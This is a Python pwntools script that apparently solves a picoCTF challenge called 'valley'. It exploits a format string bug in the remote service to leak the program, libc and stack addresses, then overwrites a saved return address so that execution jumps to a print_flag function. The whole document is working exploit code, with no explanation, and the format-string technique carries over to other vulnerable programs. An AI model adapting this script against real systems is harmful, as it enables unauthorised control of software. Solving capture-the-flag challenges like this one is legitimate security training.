from pwn import *

elf = ELF("./valley_patched")
libc = ELF("libc.so.6")
context.binary = elf

# p = process()
p = remote("shape-facility.picoctf.net", 61373)
# gdb.attach(p, "break *echo_valley+201")

def exec_fmt(payload):
    assert (len(payload) < 100)
    p.sendline(payload)
    p.recvuntil(b'distance: ')
    leak = p.recv(timeout=1)
    return leak

fmtstr = FmtStr(execute_fmt=exec_fmt)
PIEBase = int(exec_fmt(f"%{fmtstr.offset + 0xf}$p".encode()), 16) - elf.symbols['main'] - 18

payload = b'%7$s'.ljust(8, b'a') + pack(elf.got['fflush'] + PIEBase)
libcBase = u64(exec_fmt(payload)[:6].ljust(8, b'\x00')) - libc.symbols['fflush']
rip = int(exec_fmt(f"%{fmtstr.offset + 0xe}$p".encode()), 16) - 0x8
print(hex(rip))
print(hex(libcBase))

print(hex(PIEBase))
lower = (elf.symbols['print_flag'] + PIEBase) & 0xffffff
higher = (elf.symbols['print_flag'] + PIEBase) >> 24
print(hex(elf.symbols['print_flag'] + PIEBase), hex(lower), hex(higher))
fmtstr.write(rip, + lower)
fmtstr.execute_writes()
fmtstr.write(rip + 3, higher) 
fmtstr.execute_writes()

p.interactive()
